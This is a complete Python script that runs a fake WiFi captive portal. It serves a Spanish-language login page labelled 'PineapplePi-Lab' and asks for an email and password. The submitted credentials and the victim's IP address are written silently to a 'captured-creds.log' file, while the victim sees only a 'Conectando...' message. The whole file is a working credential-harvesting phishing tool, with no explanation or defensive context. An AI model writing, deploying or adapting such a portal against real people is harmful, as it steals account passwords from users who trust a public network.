#!/usr/bin/env python3
import http.server, datetime, os
LOG=os.path.join(os.path.dirname(os.path.abspath(__file__)),"captured-creds.log")
PAGE=b'''<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<title>WiFi Login</title><body style="font-family:sans-serif;max-width:340px;margin:50px auto;text-align:center">
<h2>PineapplePi-Lab</h2><p>Inicia sesion para acceder a Internet</p>
<form method=POST action=/login>
<input name=email placeholder=Email style="display:block;width:100%;margin:8px 0;padding:10px;box-sizing:border-box">
<input name=password type=password placeholder=Contrasena style="display:block;width:100%;margin:8px 0;padding:10px;box-sizing:border-box">
<button style="padding:10px 24px">Conectar</button></form></body>'''
class H(http.server.BaseHTTPRequestHandler):
    def out(self,b):
        self.send_response(200); self.send_header("Content-Type","text/html")
        self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_GET(self): self.out(PAGE)
    def do_POST(self):
        n=int(self.headers.get("Content-Length","0")); d=self.rfile.read(n).decode("utf-8","replace")
        open(LOG,"a").write("%s %s %s\n"%(datetime.datetime.now(), self.client_address[0], d))
        self.out(b"<body style='font-family:sans-serif;text-align:center;margin-top:60px'>Conectando...</body>")
    def log_message(self,*a): pass
http.server.HTTPServer(("0.0.0.0",80),H).serve_forever()
